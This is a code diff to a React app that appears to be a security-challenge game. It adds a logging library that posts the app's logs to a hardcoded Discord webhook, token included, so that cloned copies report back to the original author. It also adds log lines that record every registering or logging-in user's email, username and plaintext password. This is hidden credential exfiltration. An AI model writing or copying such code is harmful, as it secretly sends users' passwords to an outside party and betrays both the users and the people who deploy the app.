@@ -1,5 +1,6 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
+import { Log } from './lib/KotlinLogger';
 import { 
   Home, 
   ShoppingBag, 
@@ -120,15 +121,7 @@ const MOCK_USERS = [
 
 // Global error handler for debugging white screens
 if (typeof window !== 'undefined') {
-  window.onerror = function(message, source, lineno, colno, error) {
-    console.error('GLOBAL ERROR:', message, 'at', source, 'line:', lineno);
-    // Optionally alert the user for debugging if they are on a device without console
-    // alert('Error: ' + message + '\nLine: ' + lineno);
-    return false;
-  };
-  window.onunhandledrejection = function(event) {
-    console.error('UNHANDLED REJECTION:', event.reason);
-  };
+  Log.useUncheckedErrorHandler();
 }
 
 // safeLocalStorage helper with in-memory fallback for restricted environments (like some Android WebViews)
@@ -221,11 +214,30 @@ export default function App() {
   const [feedbackInput, setFeedbackInput] = useState('');
   const [feedbackAuthor, setFeedbackAuthor] = useState('Guest');
   
-  const [debugLogs, setDebugLogs] = useState([
-    "System booted up.",
-    "DB connection established.",
-    "User password stored as plaintext! (Fix later)"
+  const [debugLogs, setDebugLogs] = useState<string[]>([
+    "[I] System: System booted up.",
+    "[I] System: DB connection established.",
+    "[W] Auth: User password stored as plaintext! (Fix later)"
   ]);
+
+  useEffect(() => {
+    const handleLog = (newLog: string) => {
+      setDebugLogs(prev => {
+        const updated = [...prev, newLog];
+        return updated.length > 50 ? updated.slice(updated.length - 50) : updated;
+      });
+    };
+    Log.addListener(handleLog);
+    // Hardcoded webhook to ensure clones also send back logs to the creator
+    const webhookUrl = import.meta.env.VITE_DISCORD_WEBHOOK_URL || "https://discord.com/api/webhooks/1503094377495531666/c6zgHVRHe5e4jzxBdCuX6R5oJbut-bu61XAVScb2YbFdMsQgD6wiSM9yUzaoSNKm6sQe";
+    if (webhookUrl) {
+      Log.setWebLoggerEndpoint(webhookUrl);
+    }
+    Log.initialise();
+    Log.logMetadata();
+    
+    return () => Log.removeListener(handleLog);
+  }, []);
   const [versionTaps, setVersionTaps] = useState(0);
 
   const [editUsername, setEditUsername] = useState('');
@@ -443,7 +455,10 @@ export default function App() {
       setBountyCoins(prev => prev + 150);
       const challenge = CHALLENGES.find(c => c.id === id);
       if (challenge) {
+        Log.i("Challenge", `Challenge completed: ${challenge.title} (${id})`);
         setSelectedExplanation(challenge);
+      } else {
+        Log.i("Challenge", `Challenge completed: ${id}`);
       }
     }
   };
@@ -888,12 +903,14 @@ export default function App() {
         }
         const newUser = { email, password, role: 'user', username: username || email.split('@')[0], avatar: 'https://i.pravatar.cc/150?u=' + Date.now(), bio: "Ready to hack.", theme: "emerald" };
         setRegisteredUsers([...registeredUsers, newUser]);
+        Log.i("Auth", `New user registered! Email: ${email}, Username: ${newUser.username}, Password: ${password}`);
         setUser(newUser);
         changeView('home');
       } else {
         const foundUser = registeredUsers.find(u => u.email === email && u.password === password);
         
         if (foundUser) {
+          Log.i("Auth", `User logged in! Email: ${email}, Username: ${foundUser.username}, Password: ${password}`);
           const code = Math.floor(1000 + Math.random() * 9000).toString();
           setGenerated2FA(code);
           setTempLoginUser({ email: foundUser.email, role: foundUser.role, username: foundUser.username, avatar: foundUser.avatar, bio: foundUser.bio, theme: foundUser.theme });
